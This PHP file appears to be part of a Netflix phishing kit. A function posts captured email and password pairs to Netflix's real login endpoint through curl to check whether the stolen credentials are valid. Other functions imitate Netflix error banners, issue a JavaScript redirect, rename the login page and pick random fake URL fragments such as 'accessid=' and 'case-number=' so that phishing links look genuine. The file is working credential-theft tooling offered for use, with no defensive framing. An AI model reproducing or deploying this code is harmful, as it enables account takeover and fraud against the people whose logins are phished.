<?php

	session_start();
	error_reporting(0);
	set_time_limit(0);
	header('Content-type: text/html; charset-UTF-8');
	date_default_timezone_set('GMT');
	function _9lab_69($r9, $rj, $sf){
	return str_replace($r9, $rj, $sf); 
	}
	function HF_URL($srv, $usr, $url, $pstf, $pst, $cks, $rtf, $vrb, $flw, $hdr){
	$ci = curl_init();
	curl_setopt_array($ci, array(
	CURLOPT_TIMEOUT => 0,
	CURLOPT_SSL_VERIFYPEER => $srv,
	CURLOPT_USERAGENT => $usr,
	CURLOPT_URL => $url,
	CURLOPT_POSTFIELDS => $pstf,
	CURLOPT_POST => $pst,
	CURLOPT_COOKIESESSION => $cks,
	CURLOPT_RETURNTRANSFER => $rtf,
	CURLOPT_VERBOSE => $vrb,
	CURLOPT_FOLLOWLOCATION => $flw,
	CURLOPT_HEADER => $hdr
	));
	return curl_exec($ci);
	curl_close($ci);
	}
	function X(){
	$caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZ-abcdefghijklmnopqrstuvwxyz";
	$desordenada = str_shuffle($caracteres);
	return substr($desordenada, 1, rand(4,13));
	}
	function Y(){
	return X();
	}
	function HF_true($eml, $pss, $damdoma){
	$ck = 'https://www.netflix.com/login';
	$ac = 'https://www.netflix.com/ma-fr/login';
	$in = "email=$eml&password=$pss&";
	$in .= "rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction";
	$in .= "&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&authURL=1491091846960.LFOlt5Ul5E6fhQUld8JW5MJJ55M%3D&nextPage=";
 	$tr = HF_URL(0, $damdoma, $ck, 0, 0, 0, 0, 0, 0, 0);
 	$tr = HF_URL(0, $damdoma, $ac, $in, 0, 0, 0, 0, 0, 0);
	return (preg_match('/name="password"/i', $tr)) ? false : true;
	}
	function Ktab_ma3lomat_S7a7in($error, $message){
	if(isset($error) || $error == 'false'){
	return '<div class="ui-message-container ui-message-error">
<div class="ui-message-icon">
</div>
<div class="ui-message-contents">
'.$message.'
<a><?php echo $err2;?></a>
</div>
</div>';
	}
	}
	function Stasyoni_Hna($fin, $tkhrbi9, $blad){
	return "<html><head>
	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"> 
	<script language=\"javascript\"> 
	var sir9wd = \"./$fin$tkhrbi9$blad\"           
	top.location = sir9wd; 
	</script>  
	</head> 
	</html>\n";
	}
	$login = array("login.php");
	function w9lab_Wcha9lab(){
	global $login;
	$login_jdid = $login[array_rand($login)];
	foreach ($login  as $kyn_login) {
	if (file_exists($kyn_login)) {
	return rename($kyn_login,$login_jdid);
	}
	}
	}
	function Arana_Script(){
	global $login;
	foreach ($login  as $dkhol_index) {
	if (file_exists($dkhol_index)) {
	return $dkhol_index.'?';
	}
	}
	}
	$randzab = array("authen-token/", "iduser=", "accessid=", "id=",
	"manage-account/", "case-number=", "access-user/", "confirm-id/");
	function Rand_Dzab(){
	global $randzab;
	return $randzab[array_rand($randzab)];
	}


?>
